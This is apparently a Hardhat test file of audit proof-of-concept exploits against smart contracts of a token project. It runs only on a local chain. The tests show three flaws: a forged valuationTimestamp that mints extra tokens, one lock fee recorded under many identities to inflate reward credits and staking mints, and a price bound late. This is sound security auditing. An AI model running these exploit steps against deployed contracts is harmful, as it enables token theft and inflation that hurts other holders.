// Rig 7 follow-up: proofs of concept for three Verifier findings (C01, H02, M01) found by
// manual triage next to Slither. Read-only demonstration on a local Hardhat
// chain with the production contracts (BaseCommitmentVaultLock, the Base
// reader, Verifier, VCLM, CHONX, Forge, Stake). Nothing here is deployed.
// Run from base-contracts:
//   NODE_PATH=$PWD/node_modules npx hardhat test ../testing-rigs/static-poc/verifier_input_gaps.test.cjs
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

const SCALE = 10n ** 18n;
const DAY = 86400n;
const SEVEN_DAYS = 604800n;
const ETH_ID = "0xde7085290190e1f2f7f2f83d26fa72e411f9d765ddd608a77e8a7c388113943b";

async function deploy() {
  const [deployer, user] = await ethers.getSigners();
  const nonce = await deployer.getNonce();
  const predicted = ethers.getCreateAddress({ from: deployer.address, nonce: nonce + 4 });
  const Token = await ethers.getContractFactory("VinculumFinalisToken");
  const vclm = await Token.deploy("Vinculum Finalis VCLM", "VCLM", 10_000_000_000n * SCALE);
  const chonx = await Token.deploy("Vinculum Finalis CHONX", "CHONX", 100_000_000_000n * SCALE);
  const synth = await (await ethers.getContractFactory("VinculumFinalisSynth")).deploy(predicted, await vclm.getAddress(), await chonx.getAddress());
  const stake = await (await ethers.getContractFactory("VinculumFinalisStake")).deploy(
    await vclm.getAddress(), await chonx.getAddress(), await synth.getAddress(), predicted);
  const verifier = await (await ethers.getContractFactory("VinculumFinalisVerifier")).deploy(await vclm.getAddress(), await chonx.getAddress());
  expect(await verifier.getAddress()).to.equal(predicted);
  await (await vclm.initialize(predicted, await stake.getAddress())).wait();
  await (await chonx.initialize(predicted, ethers.ZeroAddress)).wait();
  const lock = await (await ethers.getContractFactory("BaseCommitmentVaultLock")).deploy(
    "Base", deployer.address, await vclm.getAddress(), await chonx.getAddress(), await synth.getAddress());
  const reader = await (await ethers.getContractFactory("BaseLockRecordVerifier")).deploy(await lock.getAddress());
  await (await verifier.registerChainVerifier("Base", await reader.getAddress())).wait();
  await (await verifier.registerAssetPrecision("Base", ETH_ID, "ETH", 18, 2, 0)).wait();
  await (await verifier.setScheduledPricePoster(deployer.address)).wait();
  await (await verifier.configureDevFund("Base", deployer.address)).wait();
  await (await verifier.applyScheduledPriceRun(1n, [{ environmentId: "Base", canonicalAssetId: ETH_ID, priceUsd18: 1000n * SCALE, success: true }])).wait();
  await (await verifier.finalize()).wait();
  return { deployer, user, lock, vclm, verifier, stake };
}

async function lock7d(lock, user, eth) {
  const lockId = ethers.hexlify(ethers.randomBytes(32));
  await (await lock.connect(user).createNativeLock(
    lockId, user.address, 0, ETH_ID, ethers.ZeroHash, user.address, SEVEN_DAYS, 1n * SCALE, { value: eth })).wait();
  return { lockId, rec: await lock.lockRecord(lockId) };
}

function pkg(lockId, rec, recipient, racIdentity, valuationTimestamp) {
  return {
    sourceEnvironmentId: "Base", commitmentVaultLockId: lockId, handshakeAllowanceCount: 3,
    canonicalAssetId: ETH_ID, assetPrecision: 18, assetCustodyClass: 2,
    grossAmountSmallestUnits: rec.gross, actualFeeAmountSmallestUnits: rec.fee, principalAmountSmallestUnits: rec.principal,
    feeAssetId: ETH_ID, devFundDestination: "dev", feeTransferEvidence: ethers.id("fee"),
    valuationTimestamp, maturityTimestamp: rec.maturity, durationSecs: rec.duration,
    selectedOutputToken: rec.outputToken, baseRecipient: recipient, releaseDestination: "release",
    chonxActivationReceipt: "0x", racIdentity, priceRecord: "0x", sourceFinalityProof: "0x",
    lockEventProof: ethers.AbiCoder.defaultAbiCoder().encode(
      ["bytes32", "uint256", "uint256", "uint256", "uint256", "uint256", "uint256"],
      [lockId, rec.gross, rec.fee, rec.principal, rec.duration, rec.createdAt, rec.maturity]),
  };
}

describe("static rig PoC: Verifier input gaps (findings only, no fix)", function () {
  it("STATIC-H02: caller-chosen valuationTimestamp skips emission decay", async function () {
    const { user, lock, vclm, verifier } = await deploy();
    // One year after launch.
    await network.provider.send("evm_increaseTime", [Number(365n * DAY)]);
    await network.provider.send("evm_mine");
    const eth = ethers.parseEther("0.01"); // $10
    const a = await lock7d(lock, user, eth);
    const honest = pkg(a.lockId, a.rec, user.address, ethers.id("rac-a"), a.rec.createdAt);
    await (await verifier.recordFeeAndRac(honest)).wait();
    const b0 = await vclm.balanceOf(user.address);
    await (await verifier.verifyAndMint(honest, 0)).wait();
    const honestMint = (await vclm.balanceOf(user.address)) - b0;

    const b = await lock7d(lock, user, eth);
    const forged = pkg(b.lockId, b.rec, user.address, ethers.id("rac-b"), 0n); // valuationTimestamp = 0
    await (await verifier.recordFeeAndRac(forged)).wait();
    const b1 = await vclm.balanceOf(user.address);
    await (await verifier.verifyAndMint(forged, 0)).wait();
    const forgedMint = (await vclm.balanceOf(user.address)) - b1;
    console.log(`      honest mint ${ethers.formatEther(honestMint)} VCLM, valuationTimestamp=0 mint ${ethers.formatEther(forgedMint)} VCLM`);
    expect(forgedMint).to.be.gt(honestMint); // gap demonstrated
  });

  it("STATIC-C01: one lock records many RAC credits under different racIdentity values", async function () {
    const { user, lock, verifier } = await deploy();
    const a = await lock7d(lock, user, ethers.parseEther("1")); // $1000
    const epoch = await verifier.currentEpoch();
    for (let i = 0; i < 5; i++) {
      await (await verifier.connect(user).recordFeeAndRac(pkg(a.lockId, a.rec, user.address, ethers.id("rac-" + i), a.rec.createdAt))).wait();
    }
    const one = await verifier.racCredits(ethers.id("rac-0"));
    const basis = await verifier.epochRewardBasis(epoch);
    console.log(`      one credit ${one}, epoch reward basis after 5 calls ${basis}`);
    expect(basis).to.equal(one * 5n); // five credits from one fee
  });

  it("STATIC-M01: price is bound at first proof submission, not at lock creation", async function () {
    const { deployer, user, lock, verifier } = await deploy();
    const a = await lock7d(lock, user, ethers.parseEther("0.01"));
    // A later scheduled run doubles the price before the user submits.
    await (await verifier.connect(deployer).applyScheduledPriceRun(2n, [{ environmentId: "Base", canonicalAssetId: ETH_ID, priceUsd18: 2000n * SCALE, success: true }])).wait();
    await (await verifier.recordFeeAndRac(pkg(a.lockId, a.rec, user.address, ethers.id("rac-p"), a.rec.createdAt))).wait();
    const lockIdHash = ethers.solidityPackedKeccak256(["string", "bytes32"], ["Base", a.lockId]);
    const bound = await verifier.lockReferencePrices(lockIdHash);
    console.log(`      price at lock creation 1000, bound price ${ethers.formatEther(bound.priceUsd18)}`);
    expect(bound.priceUsd18).to.equal(2000n * SCALE);
  });

  it("STATIC-C01b: Stake.allocateEpoch mints VCLM on the inflated basis", async function () {
    const { user, lock, vclm, verifier, stake } = await deploy();
    // Get some VCLM honestly and stake it so epoch 2 has weight.
    const a = await lock7d(lock, user, ethers.parseEther("0.01"));
    const p0 = pkg(a.lockId, a.rec, user.address, ethers.id("rac-seed"), a.rec.createdAt);
    await (await verifier.recordFeeAndRac(p0)).wait();
    await (await verifier.verifyAndMint(p0, 0)).wait();
    const bal = await vclm.balanceOf(user.address);
    await (await vclm.connect(user).approve(await stake.getAddress(), bal)).wait();
    await (await stake.connect(user).createPosition(0, bal, 120n * DAY)).wait();
    // Move into epoch 2 and record the same lock fee under 20 identities.
    await network.provider.send("evm_increaseTime", [Number(11n * DAY)]);
    await network.provider.send("evm_mine");
    const b = await lock7d(lock, user, ethers.parseEther("1")); // $1000
    const epoch = await verifier.currentEpoch();
    expect(epoch).to.equal(2n);
    for (let i = 0; i < 20; i++) {
      await (await verifier.connect(user).recordFeeAndRac(pkg(b.lockId, b.rec, user.address, ethers.id("dup-" + i), b.rec.createdAt))).wait();
    }
    const one = await verifier.racCredits(ethers.id("dup-0"));
    // Close and allocate epochs 1 and 2 after epoch 3 ends.
    await network.provider.send("evm_increaseTime", [Number(20n * DAY)]);
    await network.provider.send("evm_mine");
    await (await stake.closeEpoch(1)).wait();
    await (await stake.closeEpoch(2)).wait();
    await (await stake.allocateEpoch(1)).wait();
    const s0 = await vclm.balanceOf(await stake.getAddress());
    await (await stake.allocateEpoch(2)).wait();
    const minted = (await vclm.balanceOf(await stake.getAddress())) - s0;
    const honestReward = (one * 100n) / 10n;
    console.log(`      one fee should give ${ethers.formatEther(honestReward)} reward VCLM; Stake minted ${ethers.formatEther(minted)} VCLM for epoch 2`);
    expect(minted).to.equal(honestReward * 20n);
  });
});
